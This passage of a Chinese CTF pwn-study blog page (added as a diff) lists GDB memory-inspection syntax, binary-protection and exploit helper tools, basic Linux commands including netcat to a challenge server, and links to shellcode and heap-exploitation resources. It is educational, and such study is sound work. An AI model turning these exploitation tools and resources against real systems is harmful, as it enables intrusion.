+<li>f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是 s，如果地址是指令地址，那么格式可以是 i。<ul>
+<li>x 按十六进制格式显示变量。 </li>
+<li>d 按十进制格式显示变量。 </li>
+<li>u 按十进制格式显示无符号整型。 </li>
+<li>o 按八进制格式显示变量。</li>
+<li>t 按二进制格式显示变量。 </li>
+<li>a 按十六进制格式显示变量。 </li>
+<li>i 指令地址格式 </li>
+<li>c 按字符格式显示变量。 </li>
+<li>f 按浮点数格式显示变量。</li>
+</ul>
+</li>
+<li>u表示一个地址单元的长度 <ul>
+<li>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。</li>
+<li>当我们指定了字节长度后，GDB会从指内存指定的内存地址开始，读写指定字节，并把其当作一个值取出来。</li>
+<li>b表示单字节， h表示双字节， w表示四字节， g表示八字节</li>
+</ul>
+</li>
+<li><addr> 表示一个内存地址。</addr></li>
+<li>注意：严格区分n和u的关系，n表示单元个数，u表示每个单元的大小。</li>
+</ul>
+<p>命令：x/3uh 0x54320<br>含义：从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示输出三个单位，u表示按无符号十进制显示。</p>
+<ul>
+<li>checksec<ul>
+<li>随pwntools安装的一个命令行工具</li>
+<li>查看二进制文件保护措施的信息</li>
+<li>使用：checksec a.out</li>
+</ul>
+</li>
+<li>ROPgadget</li>
+<li>one_gadget</li>
+<li>LibcSearcher</li>
+<li>main_arena_offset</li>
+</ul>
+<h3 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h3><ul>
+<li>Teminal<ul>
+<li>终端</li>
+<li>可以运行多个shell</li>
+</ul>
+</li>
+<li>shell<ul>
+<li>用户与操作系统交互的接口（GUI图形用户接口/界面）</li>
+<li>zsh、sh、bash</li>
+</ul>
+</li>
+<li><p>Linux快捷键</p>
+<ul>
+<li>Ctrl + D：exit（退出）</li>
+<li>Ctrl + C：中断/终止</li>
+<li>Ctrl + Alt</li>
+<li>Ctrl + -/+</li>
+<li>Ctrl + Shift + C/V</li>
+</ul>
+</li>
+<li><p>Linux命令</p>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ file <span class="hljs-built_in">test</span>		<span class="hljs-comment"># 识别文件类型</span><br><br><span class="hljs-comment"># 运行文件</span><br>$ ./<span class="hljs-built_in">test</span><br>$ python exp.py<br><br><span class="hljs-comment"># 指定解释器: #!/bin/python3</span><br>$ chmod +x exp.py<br>$ sudo ./exp.py<br><br>$ nc 196.128.0.1 10001		<span class="hljs-comment"># 运行远程文件</span><br><br>$ man 3 gets	<span class="hljs-comment"># 可以通过一些参数，快速查询linux帮助手册，并且格式化显示。</span><br><br>$ <span class="hljs-built_in">echo</span> &lt;base64&gt; | base64 -d<br><br><span class="hljs-comment"># 在对象文件或二进制文件中查找可打印的字符串</span><br>$ strings phone_book<br>$ strings phone_book | grep fleg<br></code></pre></td></tr></table></figure>
+<h2 id="PartEx3-网站"><a href="#PartEx3-网站" class="headerlink" title="PartEx3 网站"></a>PartEx3 网站</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9">yichen的信安知识库 · 语雀 (yuque.com)</a></p>
+<p><strong>Shellcode：</strong></p>
+<p><a target="_blank" rel="noopener" href="http://shell-storm.org/">shell-storm | Home</a></p>
+<p><strong>Format String Tools and Ref</strong></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/hellman/libformatstr">https://github.com/hellman/libformatstr</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</a></p>
+</li>
+</ul>
+<p><strong>Heap:</strong></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://heap-exploitation.dhavalkapil.com/">Preface - heap-exploitation (dhavalkapil.com)</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p>
+</li>
+<li><p>www.slideshare.net/AngelBoy1?utm_campaign=profiletracking&amp;utm_medium=sssite&amp;utm_source=ssslideview</p>
+</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Pwn/">Pwn</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Pwn/">Pwn</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/02/19/Code/C/C-issue/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">C issue</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/01/Tools/Git/Git%E6%89%93%E6%A0%87%E7%AD%BE/">
+                        <span class="hidden-mobile">Git打标签</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
